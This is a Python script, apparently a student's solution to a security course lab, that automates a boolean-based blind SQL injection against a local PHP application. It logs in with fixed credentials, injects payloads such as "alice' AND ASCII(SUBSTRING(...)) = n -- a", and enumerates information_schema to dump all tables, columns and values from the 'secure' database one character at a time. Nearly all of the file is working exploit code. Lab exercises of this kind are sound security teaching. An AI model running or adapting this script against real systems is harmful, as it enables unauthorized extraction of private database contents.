# We wrote this script to solve Section 5, Using the blind sql vulnerability.
# Because the database doesn't return the results directly, we had to figure out another way to extract the data.
# The idea was to send queries that return only True or False answers, and based on that, guess the value character by character.
# This script helped us automate the guessing process by sending many HTTP requests.
# Each time, we checked whether the phrase "In wonderland right now" appeared on the page, if yes, it's a True response.
# If the phrase doesn't appear, it's a False response.
# Using this approach, we were able to find the required data from the secure database.

import urllib.request
import urllib.parse
import string
import http.cookiejar

BASE_URL = "http://localhost:8000/blindsqli.php?user="

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
urllib.request.install_opener(opener)


def automatic_login():
    login_url = "http://localhost:8000/login.php" 
    login_data = urllib.parse.urlencode({
        'uid': 'bob', 
        'password': 'password' 
    }).encode('utf-8')
    
    try:
        urllib.request.urlopen(login_url, data=login_data)
        
        for cookie in cj:
            if cookie.name == 'PHPSESSID':
                print(f"Login successful! Captured Cookie: {cookie.name}={cookie.value}")
                return True
        return False
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return False


def check_boolean_query(payload):
    encoded_payload = urllib.parse.quote(payload)
    url = BASE_URL + encoded_payload
   
    req = urllib.request.Request(url)
   
    response = urllib.request.urlopen(req)
    html_content = response.read().decode('utf-8')
    
    # This text will appear on the screen only if the query was successful
    if "In wonderland right now" in html_content:
        return True
    else:
        return False


def calculate_length(query):
    length = 0
    for i in range(1, 100):
        payload = f"alice' AND LENGTH(({query})) = {i} -- a"
        if check_boolean_query(payload):
            length = i
            break
    
    # couldn't find answer with length between 1 to 100
    if length == 0:
        return None
   
    return length


def guess_query(query, length):
    # we assume that all characters contain only latin letters and digits.
    charset = string.ascii_letters + string.digits
    result = ""
    for i in range(1, length + 1):
        for char in charset:
            char_ascii = ord(char)
            payload = f"alice' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {char_ascii} -- a"
            if check_boolean_query(payload):
                result += char
                break
    return result


def extract_query(query):
    length = calculate_length(query)
    if length is None:
        return None
    return guess_query(query, length)


def handle_table(table_name):
    print(f'{"-" * 50}\n  TABLE NAME: {table_name}\n{"-" * 50}')
    table = []
    n_columns = 1


    count_query = f"SELECT COUNT(*) FROM secure.{table_name}"
    row_count = int(extract_query(count_query))

    while True:
        # take one column starting from offset n_columns
        col_name_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {n_columns-1}, 1"
        col_name = extract_query(col_name_query)
        if col_name == None:
            break
        else:
            table.append((col_name, handle_col(table_name, col_name, row_count)))
            n_columns += 1
    print(f'In table {table_name} found {len(table)} columns (fields) and {row_count} rows (entries):')
    print_table(table)


def handle_col(table_name, col_name, row_count):
    ret = []
    for i in range(row_count):
        val_query = f"SELECT {col_name} FROM secure.{table_name} LIMIT {i}, 1"
        value = extract_query(val_query)
        ret.append(value)
    return ret


def print_table(columns):
    fields = [col[0] for col in columns]
    n = len(columns)
    m = len(columns[0][1])
    to_print = [[0] * n for _ in range(m)]


    fields = [col[0] for col in columns]
    for i in range(n):
        for j in range(m):
            to_print[j][i] = columns[i][1][j]

    line = ''
    for field in fields:
        line += f'{field:<10}'
    print(line)
    for row in to_print:
        line = ''
        for val in row:
            line += f'{val:<10}'
        print(line)


if __name__ == "__main__":
    print("This script is performing a blind sql attack.")
    print("It can ask true or false questions to the database by trying to sign in as alice if an expression is true.")
    print("This script find all of the tables in the \'secure\' database (there\'s only one),\n look for all the columns for the table (again, only one) and find the values of the fields in the table.\n")

    if not automatic_login():
        exit(1)

    # The following query ment to check if we can even access the db.
    if not check_boolean_query("alice' AND 1=1 -- a"):
        print("\nSanity Check FAILED! Make sure your Cookie hasn't expired.")
    else:
        n_tables = 1
        while True:
            # take one table starting from offset n_tables
            sql_table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT {n_tables-1}, 1"
            table_name = extract_query(sql_table_query)
            if table_name == None:
                break
            else:
                handle_table(table_name)
                n_tables += 1
